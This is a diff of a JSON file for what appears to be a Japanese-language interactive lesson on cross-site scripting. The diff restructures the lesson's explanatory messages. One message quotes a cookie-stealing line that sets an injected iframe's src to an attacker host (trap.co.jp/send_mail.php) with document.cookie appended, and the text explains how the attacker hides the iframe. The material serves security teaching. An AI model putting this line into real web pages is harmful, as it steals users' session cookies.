@@ -8,8 +8,11 @@
                 "focusComponents": [
                     []
                 ],
-                "texts": [
-                   "これが攻撃者が脆弱なWebサイトに埋め込もうとしているスクリプトです。"
+                "messages": [
+                    {
+                        "text": "これが攻撃者が脆弱なWebサイトに埋め込もうとしているスクリプトです。",
+                        "languages": []
+                    }
                 ]
             },
             {
@@ -18,10 +21,16 @@
                 "focusComponents": [
                     []
                 ],
-                "texts": [
-                        "以下の部分でユーザのCookieを盗もうとしています。\niframe.setAttribute(\"src\", \"http://www.trap.co.jp/send_mail.php?cookie=\" + document.cookie)",
-                        "この<iframe>要素によって脆弱なWebサイトに攻撃者の用意したsend_mail.phpというサイトが埋め込まれ、さらにcookieの値にユーザのCookieが設定されて送信されます。\nさらに攻撃者はsend_mail.php内で受け取ったCookieの値を自分自身に対してメールで送信することにより、攻撃が完了します。"
-                        ]
+                "messages": [
+                    {
+                        "text": "以下の部分でユーザのCookieを盗もうとしています。\niframe.setAttribute(\"src\", \"http://www.trap.co.jp/send_mail.php?cookie=\" + document.cookie)",
+                        "languages": ["html", "javaScript"]
+                    },
+                    {
+                        "text": "この<iframe>要素によって脆弱なWebサイトに攻撃者の用意したsend_mail.phpというサイトが埋め込まれ、さらにクエリパラメータのcookieの値にユーザのCookieが設定されて送信されます。\nそして攻撃者はsend_mail.php内で受け取ったユーザのCookieの値を自分自身に対してメールで送信することにより、攻撃が完了します。",
+                        "languages": ["html"]
+                    }
+                ]
             },
             {
                 "questionIndices": [],
@@ -29,7 +38,12 @@
                 "focusComponents": [
                     []
                 ],
-                "texts": ["今回は分かりやすさを狙ってiframe要素にwidth, heightを指定して、実際に画面に表示しようとしていますが本来であれば攻撃者はこの<iframe>要素の表示を隠すことによって攻撃を隠蔽します。"]
+                "messages": [
+                    {
+                        "text": "今回は分かりやすさを狙って<iframe>要素にwidth, heightを指定して、実際に画面に表示しようとしていますが本来であれば攻撃者はこの<iframe>要素の表示を隠すことによって攻撃を隠蔽します。",
+                        "languages": ["html"]
+                    }
+                ]
             },
             {
                 "questionIndices": [],
@@ -39,8 +53,11 @@
                 "focusComponents": [
                     []
                 ],
-                "texts": [
-                    "この赤枠で囲まれた部分で脆弱なWebサイトの<body>要素に<iframe>要素を追加しています。"
+                "messages": [
+                    {
+                        "text": "この赤枠で囲まれた部分で脆弱なWebサイトの<body>要素に<iframe>要素を追加しています。",
+                        "languages": ["html"]
+                    }
                 ]
             },
             {
@@ -49,7 +66,12 @@
                 "focusComponents": [
                     []
                 ],
-                "texts": ["次に攻撃者に対してユーザのCookieをメールで送信するsend_mail.phpを見ていきましょう。"]
+                "messages": [
+                    {
+                        "text": "次に攻撃者に対してユーザのCookieをメールで送信するsend_mail.phpを見ていきましょう。",
+                        "languages": []
+                    }
+                ]
             }
         ]
 }
